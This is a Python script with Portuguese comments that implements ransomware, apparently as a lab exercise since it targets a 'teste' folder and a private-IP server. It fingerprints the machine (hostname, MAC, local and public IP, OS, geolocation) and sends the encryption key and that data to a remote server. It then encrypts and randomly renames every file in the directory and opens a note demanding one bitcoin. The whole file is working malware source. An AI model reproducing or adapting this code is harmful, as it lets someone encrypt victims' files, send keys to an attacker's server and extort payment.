import os
import requests
from cryptography.fernet import Fernet
import socket
import platform
import uuid
import requests
import json
import random
import string
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import subprocess

# Função para criar o arquivo teste.txt
def create_test_file():
    file_path = "teste.txt"
    with open(file_path, "w") as file:
        file.write("Sua máquina foi infectada! Para recuperar seus dados, faça o depósito de 1 btc no endereço da carteira a seguir: xxxxxxxx")
    return file_path

# Função para exibir o popup no Windows
def show_popup_windows(file_path):
    try:
        subprocess.Popen(['notepad.exe', file_path])
    except Exception as e:
        print(f"Erro ao abrir o popup: {e}")

# Função para exibir o popup no Linux
def show_popup_linux(file_path):
    try:
        subprocess.Popen(['xdg-open', file_path])
    except Exception as e:
        print(f"Erro ao abrir o popup: {e}")

def show_popup():
    test_file = create_test_file()
    if os.name == 'nt':  # Verifica se é Windows
        show_popup_windows(test_file)
    else:  # Supondo que qualquer outro SO seja Linux
        show_popup_linux(test_file)

SERVER_URL = "http://10.0.2.15:5000"

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_name, key):
    f = Fernet(key)
    with open(file_name, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_name, "wb") as file:
        file.write(encrypted_data)

def generate_random_name():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + ".gciber"

def find_and_encrypt_files(key):
    original_names = {} # Dicionário para armazenar os nomes originais.
    
    # Diretório de teste
    current_directory = "teste"
    #current_directory = os.getcwd()  # Obtém o diretório atual
    for root, dirs, files in os.walk(current_directory):  # Percorre apenas o diretório atual
        for file_name in files:
            file_path = os.path.join(root, file_name)
            # Criptografa o arquivo
            encrypt_file(file_path, key)
            # Gera um novo nome para o arquivo
            new_name = generate_random_name()
            new_file_path = os.path.join(root, new_name)
            # Renomeia o arquivo criptografado
            os.rename(file_path, new_file_path)
            # Armazena o nome original e o novo nome no dicionário.
            original_names[new_name] = file_name
            print(f"{file_name} foi encriptado e renomeado para {new_name}")
    # Salva os nomes originais em um arquivo JSON
    with open(os.path.join(current_directory, "file_names.json"), "w") as json_file:
        json.dump(original_names, json_file)

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Conecta a um servidor externo para obter o IP
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
    except Exception as e:
        print(f"Erro ao obter IP: {e}")
        ip_address = "Desconhecido"
    finally:
        s.close()
    return ip_address

def generate_machine_id():
    hostname = socket.gethostname()
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])
    machine_id = f"{hostname}-{mac_address}"
    return machine_id

def get_geolocation():
    try:
        # Chama a API ipinfo.io para obter informações de geolocalização
        response = requests.get("https://ipinfo.io")
        data = response.json()

        # Extrai informações relevantes
        city = data.get('city', 'Desconhecido')
        region = data.get('region', 'Desconhecido')
        country = data.get('country', 'Desconhecido')
        location = f"{city}, {region}, {country}"

        return location
    except Exception as e:
        print(f"Erro ao obter geocalização")
        return "Desconhecido"
    
def get_public_ip():
    try:
        # Chama um serviço que retorna o IP público da máquina infectada
        response = requests.get("https://api.ipify.org?format=json")
        public_ip = response.json()["ip"]
    except Exception as e:
        print(f"Erro ao obter IP público: {e}")
        public_ip = "Desconhecido"

    return public_ip

def send_key_to_server(machine_id, key, machine_name, ip_address, os_info, public_ip):
    location = get_geolocation()  # Obtém a localização da máquina
    data = {
        "machine_id": machine_id,
        "encryption_key": key.decode(),
        "machine_name": machine_name,
        "ip_address" : ip_address,
        "public_ip": public_ip,
        "os_info": os_info,
        "location": location
    }
    response = requests.post(f"{SERVER_URL}/api/keys/add", json=data)
    if response.status_code == 200:
        print("Chave enviada com sucesso")
    else:
        print("Falha ao enviar a chave")

# Função adicional para descobrir todas as extensões presentes no diretório
def find_extensions_in_directory(directory):
    extensions = set()
    for root, dirs, files in os.walk(directory):
        for file_name in files:
            ext = os.path.splitext(file_name)[1]
            if ext:
                extensions.add(ext)
    return sorted(extensions)

def main():
    machine_id = generate_machine_id()  # Gera o machine_id
    key = generate_key()
    machine_name = socket.gethostname()  # Obtém o nome da máquina
    ip_address = get_ip_address()  # Obtém o ip da máquina
    os_info = platform.platform()  # Obtém o nome do sistema operacional
    public_ip = get_public_ip()
    send_key_to_server(machine_id, key, machine_name, ip_address, public_ip, os_info)

    # Encontra todas as extensões presentes na pasta "teste"
    directory = "teste"  # Diretório de exemplo
    found_extensions = find_extensions_in_directory(directory)
    print(f"Extensões encontradas: {found_extensions}")

    # Criptografa todos os arquivos presentes no diretório
    find_and_encrypt_files(key)
    print(f"Todos os arquivos no diretório atual foram encriptados.")

    show_popup()

if __name__ == "__main__":
    main()
